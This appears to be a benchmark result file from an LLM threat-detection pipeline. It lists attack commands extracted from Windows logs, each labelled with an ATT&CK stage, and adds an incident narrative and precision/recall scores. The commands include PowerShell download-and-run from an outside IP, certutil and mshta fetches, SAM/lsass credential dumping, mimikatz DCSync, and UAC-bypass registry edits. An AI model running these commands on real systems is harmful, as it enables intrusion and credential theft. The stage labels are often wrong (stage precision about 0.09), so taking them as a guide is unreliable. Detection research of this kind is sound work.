@@ -1,0 +1,380 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\\u0536\\ufffd\\ufffd\\ufffd\\ufffd\\ufffd\\u02bc\\ufffdB.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\4iwlyhn4\\4iwlyhn4.cmdline\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 \"/OUT:C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\RES34B4.tmp\" \"c:\\Users\\Administrator\\AppData\\Local\\Temp\\4iwlyhn4\\CSCE10EFB0F87374A028BB2C41E7AC324B0.TMP\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 \"/OUT:C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\RES9C38.tmp\" \"c:\\Users\\Administrator\\AppData\\Local\\Temp\\pzcm3d5p\\CSCBBED3B5A8FC14E4C8BCA258D5D91B14E.TMP\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\\u0536\\ufffd\\ufffd\\ufffd\\ufffd\\ufffd\\u02bc\\ufffdB.ps1",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Start-Process .\\T1059.003_script.bat\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+        "stage": "Persistence"
+      },
+      {
+        "command": "schtasks /delete /tn test /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "netsh advfirewall firewall add rule name=\"test\" dir=in protocol=tcp action=allow localport=80",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "wmic computersystem get domain",
+        "stage": "Discovery"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" /v test /t REG_SZ /d \"C:\\windows\\\\system32\\\\calc.exe\" /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cscript.exe  /e:VBScript.Encode T1059.007.vbs",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "reg.exe save hklm\\security c:\\users\\admini~1\\appdata\\local\\temp\\tjbvkjpetfjp",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg.exe save hklm\\system c:\\users\\admini~1\\appdata\\local\\temp\\qsdirkg",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg.exe save hklm\\sam c:\\users\\admini~1\\appdata\\local\\temp\\tthwwf",
+        "stage": "Collection"
+      },
+      {
+        "command": "procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "vssadmin.exe create shadow /for=C:",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "mklink /D C:\\Temp\\vssstore \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"{New-Item \\\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\" -Force; New-ItemProperty \\\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\" -Name \\\"DelegateExecute\\\" -Value \\\"\\\" -Force; Set-ItemProperty \\\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\" -Name \\\"(default)\\\" -Value \\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\" -Force}",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group \"domain admins\" /domain\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /C \"netstat -an  \"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \\\" /v \"verifierdlls \\\" /d \"1 \\\" /f\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg delete \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \\\" /v \"verifierdlls\\\" /f\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C \"mshta.exe http://124.223.85.207:8082/T1218.005.hta\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": ".\\chromeRemoteServices.ps1",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "rundll32.exe user32.dll,LockWorkStation",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C \"tor.lnk\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "\"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\" atbroker.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1548.002 -TestNumbers 2\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "mimikatz2.exe lsadump::sam exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "mimikatz.exe LSADUMP::DCSync exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "taskkill.exe /f /im wordpad.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "taskkill.exe /f /im sangforcat.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "tasklist",
+        "stage": "Discovery"
+      },
+      {
+        "command": "reg.exe delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe /v Debugger /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe /v Debugger /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe /v Debugger /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe /v Debugger /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe /v Debugger /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C \"certutil.exe -decode a.txt b.txt\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /C \"del /f /q b.txt\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"mkdir timestomp ; echo ipconfig /all > timestomp/timestomp.txt ; (ls timestomp).LastWriteTime=``2020-10-10 12:12:12''\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "rundll32.exe user32.dll,LockWorkStation",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C \"rm /s /q timestomp\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C \"mimikatz2.exe lsadump::sam exit\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /C \"nltest /domain_trusts\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "netsh.exe interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C \"notepad.exe\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "dllhost.exe /Processid:{776DBC8D-7347-478C-8D71-791E12EF49D8}",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powercfg.exe -lastwake",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powercfg.exe -energy",
+        "stage": "Discovery"
+      },
+      {
+        "command": "tasklist /v",
+        "stage": "Discovery"
+      },
+      {
+        "command": "tasklist /fi \"imagename eq svchost.exe\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "wmic /node:localhost service get name,processid",
+        "stage": "Discovery"
+      },
+      {
+        "command": "tasklist /FI \"STATUS eq running\" /NH",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net view",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "net use",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "net share",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "cmd.exe /C \"rundll32 user32.dll,LockWorkStation\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-webrequest -uri https://www.example.com/page.html -method post\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "rundll32.exe user32.dll,LockWorkStation",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The identify malicious activities involve a sophisticated attack starting with initial access utilizing PowerShell commands to download malware from an external source. This led to further exploitation of vulnerabilities, persistence of presence, elevation of privileges, discovery of network resources, and laterally moving between systems. The attackers employed various defense evasion techniques, credential access methods, and command and control protocols throughout the campaign. Additionally, they created multiple backdoors using DLL injection, registry modifications, and creation of new files. They also attempted to hide their tracks by deleting logs and modifying the system settings. Furthermore, they stole sensitive information such as password hashes and accessed the domain controller to gather additional information. The attackers were able to maintain persistent access through scheduled tasks and Windows services. Their ultimate goal appears to be collecting sensitive information and maintaining access to the network for future attacks.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 91131,
+      "completion_tokens": 8515,
+      "total_tokens": 99646,
+      "wall_clock_s": 120.939,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.2073170731707317,
+      "recall": 0.7391304347826086,
+      "f1": 0.3238095238095238,
+      "tp": 17,
+      "fp": 65,
+      "fn": 6
+    },
+    "stage": {
+      "precision": 0.08536585365853659,
+      "recall": 0.30434782608695654,
+      "f1": 0.13333333333333333,
+      "tp": 7,
+      "fp": 75,
+      "fn": 16,
+      "recall_partial": 0.5217391304347826
+    },
+    "hallucination_rate": 0.08620689655172414,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 91131,
+      "completion_tokens": 8515,
+      "total_tokens": 99646,
+      "wall_clock_s": 120.939,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v5_got_links",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": true
+  }
+}
